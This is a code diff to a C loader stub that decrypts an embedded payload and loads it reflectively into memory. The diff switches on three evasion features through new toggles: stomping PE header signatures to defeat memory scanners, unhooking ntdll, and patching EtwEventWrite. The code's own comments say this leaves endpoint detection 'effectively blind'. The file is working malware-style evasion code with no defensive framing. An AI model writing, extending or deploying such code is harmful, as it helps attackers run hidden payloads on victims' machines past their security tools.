@@ -28,7 +28,12 @@
 /* ─── Generated per-build: encrypted payload + seed ─── */
 #include "stub_payload.h"
 
-/* ─── Evasion toggle: set to 1 to enable unhook/ETW/signature stomp ─── */
+/* ─── Evasion toggles: enable one at a time to isolate issues ─── */
+#define EVASION_STOMP   1   /* MZ/PE signature stomp in _load_pe       */
+#define EVASION_UNHOOK  1   /* ntdll .text unhooking                   */
+#define EVASION_ETW     1   /* EtwEventWrite patch                     */
+
+/* Legacy macro — leave at 0, individual toggles above take over */
 #define STUB_EVASION_ENABLED 0
 
 
@@ -1027,7 +1032,7 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     WORD peChars   = mappedNt->FileHeader.Characteristics;
     if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
 
-#if STUB_EVASION_ENABLED
+#if EVASION_STOMP
     /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
      * for reflectively loaded PEs, but leaves the rest of the header
      * page intact so the CRT and runtime can still read data directories,
@@ -1191,25 +1196,29 @@ void _stub_entry(void) {
      * the patching. After this point the EDR is effectively blind to
      * our ntdll-level operations.
      */
-#if STUB_EVASION_ENABLED
+#if EVASION_UNHOOK || EVASION_ETW
     {
         BYTE *k32   = _find_module(H_KERNEL32);
         BYTE *ntdll = _find_module(H_NTDLL);
         if (k32 && ntdll) {
+#if EVASION_UNHOOK
             _unhook_ntdll(k32, ntdll);
+#endif
+#if EVASION_ETW
             _patch_etw(k32, ntdll);
-
+#endif
+            /* Re-resolve Nt* from the now-clean ntdll */
             api.pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory_t)
                 _resolve_export(ntdll, H_NtAllocateVirtualMemory);
             api.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory_t)
                 _resolve_export(ntdll, H_NtProtectVirtualMemory);
             api.pNtFreeVirtualMemory = (fnNtFreeVirtualMemory_t)
                 _resolve_export(ntdll, H_NtFreeVirtualMemory);
-            SLOG("[stub] Nt* re-resolved after unhook");
+            SLOG("[stub] Nt* re-resolved after unhook/etw");
         }
     }
 #else
-    SLOG("[stub] evasion DISABLED for testing");
+    SLOG("[stub] unhook/etw DISABLED for testing");
 #endif
 
     /* Phase 2: Derive RC4 key from seed */
